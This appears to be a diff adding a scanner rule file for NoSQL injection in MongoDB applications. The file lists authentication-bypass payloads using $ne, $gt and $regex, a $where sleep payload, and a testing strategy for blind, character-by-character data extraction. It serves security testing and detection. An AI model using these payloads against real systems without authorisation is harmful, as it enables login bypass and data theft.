@@ -1,0 +1,29 @@
+id: NOSQLI
+name: NoSQL Injection
+cwe:
+- CWE-943
+owasp: A03:2021 Injection
+severity_range: High - Critical
+description: Application constructs NoSQL queries from user input without sanitization, allowing data extraction or authentication
+  bypass.
+detection:
+  payloads:
+    mongodb_json:
+    - '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    - '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}'
+    - '{"$where": "sleep(5000)"}'
+    mongodb_url:
+    - username[$ne]=&password[$ne]=
+    - username[$gt]=&password[$gt]=
+    - username[$regex]=^admin&password[$ne]=
+  strategy:
+  - 1. Test JSON body parameters with MongoDB operators ($ne, $gt, $regex, $where)
+  - '2. Test URL parameters with array syntax: param[$ne]=value'
+  - 3. Test for JavaScript injection via $where operator
+  - 4. Test for blind NoSQL injection via $regex with timing
+  - 5. Check for data extraction via $regex character-by-character
+evidence_needed: Authentication bypass or data extraction via NoSQL operators
+references:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+- https://book.hacktricks.xyz/pentesting-web/nosql-injection
